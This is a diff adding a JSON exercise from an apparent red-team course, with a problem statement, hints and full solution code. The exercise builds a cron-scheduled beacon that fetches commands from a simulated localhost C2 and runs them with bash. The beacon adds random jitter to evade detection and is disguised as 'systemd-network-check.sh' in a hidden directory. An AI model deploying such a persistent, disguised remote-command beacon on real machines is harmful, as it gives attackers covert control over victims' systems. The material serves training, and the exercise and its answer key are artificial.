@@ -1,0 +1,15 @@
+{
+    "id": "task2",
+    "chapterId": "ch_11",
+    "title": "Simulate a Beacon with Cron",
+    "description": "Write a script that phones home to a simulated C2 server and schedule it with cron.",
+    "estimatedMinutes": 20,
+    "problemStatement": "You are simulating a red team persistence mechanism. You need a beacon that checks in every 5 minutes.\n\n**Setup:** Since we don't have a real C2 server, we'll simulate one by writing a timestamp to a local file and attempting to fetch a 'task' from a simulated web server (use `http://localhost:8000/task` or a file).\n\n**Part 1: Beacon Script (`beacon.sh`)**\n1. The script should log the current date/time and its PID to `~/beacon.log`.\n2. It should attempt to retrieve a command from `http://localhost:8000/task`. For simulation, we'll just try to `curl` a file or a local webserver. If `curl` fails, log \"No C2 reachable\".\n3. (Simulated) If a command is received, execute it and log the output. We'll simulate this by checking if a file `~/c2_command.txt` exists; if so, cat it and execute with `eval` (be careful with eval in real life!).\n4. Use a random delay (0-30 seconds) to avoid pattern detection: `sleep $((RANDOM % 30))` before the check-in.\n\n**Part 2: Cron Schedule**\n1. Make the script executable.\n2. Add a crontab entry to run the script **every 5 minutes**.\n3. Redirect all output to `~/beacon_cron.log` for debugging.\n4. Verify the job is running by watching `~/beacon.log` grow.\n\n**Part 3: Stealth Enhancement**\n- Rename the script to something innocuous like `systemd-network-check.sh`.\n- Place it in `~/.cache/` or `~/.local/share/`.\n- Update the crontab accordingly.\n\n**Deliverable:** The crontab line and the first few lines of `~/beacon.log` showing successful execution.",
+    "hints": [
+        "Beacon script template: `echo \"$(date): Beacon PID $$\" >> ~/beacon.log`",
+        "Simulate C2 command: `if [ -f ~/c2_command.txt ]; then cat ~/c2_command.txt | bash; fi`",
+        "Cron schedule: `*/5 * * * * /home/user/.cache/systemd-network-check.sh >> /home/user/beacon_cron.log 2>&1`"
+    ],
+    "expectedOutput": "Beacon script runs every 5 minutes and logs activity.",
+    "solutionCode": "#!/bin/bash\n\nLOG_FILE=\"$HOME/beacon.log\"\nC2_FILE=\"$HOME/c2_command.txt\"\n\n# Random delay for evasion\nsleep $((RANDOM % 30))\n\necho \"$(date): Beacon check-in (PID $$)\" >> \"$LOG_FILE\"\n\n# Simulate C2 check-in (try to fetch a task)\nif curl -s --connect-timeout 2 http://localhost:8000/task > /tmp/c2_task 2>/dev/null; then\n    echo \"$(date): Task received from C2\" >> \"$LOG_FILE\"\n    bash /tmp/c2_task >> \"$LOG_FILE\" 2>&1\n    rm /tmp/c2_task\nelse\n    echo \"$(date): C2 unreachable\" >> \"$LOG_FILE\"\nfi\n\n# Fallback local command simulation\nif [ -f \"$C2_FILE\" ]; then\n    echo \"$(date): Executing local task file\" >> \"$LOG_FILE\"\n    bash \"$C2_FILE\" >> \"$LOG_FILE\" 2>&1\n    rm \"$C2_FILE\"\nfi\n\n# Crontab entry:\n# */5 * * * * /home/user/.cache/systemd-network-check.sh >> /home/user/beacon_cron.log 2>&1"
+}
